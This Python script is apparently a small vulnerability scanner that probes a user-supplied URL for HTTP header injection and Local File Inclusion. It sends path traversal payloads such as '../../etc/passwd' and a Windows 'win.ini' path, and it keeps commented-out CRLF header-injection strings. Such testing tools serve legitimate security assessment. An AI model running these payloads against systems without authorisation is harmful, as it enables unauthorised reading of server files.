import requests
from utils.printer import info, success, warning, error, prompt
import argparse

def test_header_injection(url, header_name="X-Forwarded-For"):
    info(f"Testing HTTP Header Injection on {url} with header {header_name}")
    payloads = [
        "127.0.0.1",
        "localhost",
        "8.8.8.8",
        # Removed newline payloads because requests library forbids them
        # "127.0.0.1\nInjected-Header: injected-value",
        # "127.0.0.1\r\nInjected-Header: injected-value",
    ]
    vulnerable = False
    for payload in payloads:
        headers = {header_name: payload}
        try:
            r = requests.get(url, headers=headers, timeout=5)
            if "Injected-Header" in r.headers:
                warning(f"Possible header injection with payload: {payload}")
                vulnerable = True
        except Exception as e:
            error(f"Request failed: {e}")
    if vulnerable:
        success("HTTP Header Injection vulnerability detected!")
    else:
        success("No HTTP Header Injection vulnerability detected.")

def test_lfi(url, param):
    info(f"Testing LFI on {url} with parameter {param}")
    payloads = [
        "../../etc/passwd",
        "../../../../../etc/passwd",
        "/etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
    ]
    vulnerable = False
    for payload in payloads:
        params = {param: payload}
        try:
            r = requests.get(url, params=params, timeout=5)
            if "root:x:" in r.text or "[fonts]" in r.text:
                warning(f"Possible LFI detected with payload: {payload}")
                vulnerable = True
        except Exception as e:
            error(f"Request failed: {e}")
    if vulnerable:
        success("Local File Inclusion vulnerability detected!")
    else:
        success("No Local File Inclusion vulnerability detected.")

def get_input(prompt_text):
    try:
        return input(prompt_text).strip()
    except EOFError:
        return ""

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HTTP Header Injection & LFI Tester")
    parser.add_argument("-u", "--url", help="Target URL")
    parser.add_argument("--header-test", action="store_true", help="Test HTTP header injection")
    parser.add_argument("--lfi-test", action="store_true", help="Test Local File Inclusion")
    parser.add_argument("-p", "--param", help="Parameter to test for LFI")

    args = parser.parse_args()

    # Prompt for URL if not provided but needed
    if (args.header_test or args.lfi_test) and not args.url:
        args.url = get_input("Enter target URL (including http:// or https://): ")
        while not (args.url.startswith("http://") or args.url.startswith("https://")):
            print("[ERROR] Invalid URL format. Please include 'http://' or 'https://'.")
            args.url = get_input("Enter target URL (including http:// or https://): ")

    if not args.header_test and not args.lfi_test:
        print("Specify --header-test or --lfi-test (or both). Exiting.")
        exit(1)

    if args.header_test:
        if not args.url:
            print("[ERROR] URL is required for header test.")
            exit(1)
        test_header_injection(args.url)

    if args.lfi_test:
        if not args.param:
            args.param = get_input("Enter parameter name to test for LFI (e.g. page, file): ").strip()
            while not args.param:
                print("[ERROR] Parameter name cannot be empty.")
                args.param = get_input("Enter parameter name to test for LFI (e.g. page, file): ").strip()
        if not args.url:
            print("[ERROR] URL is required for LFI test.")
            exit(1)
        test_lfi(args.url, args.param)
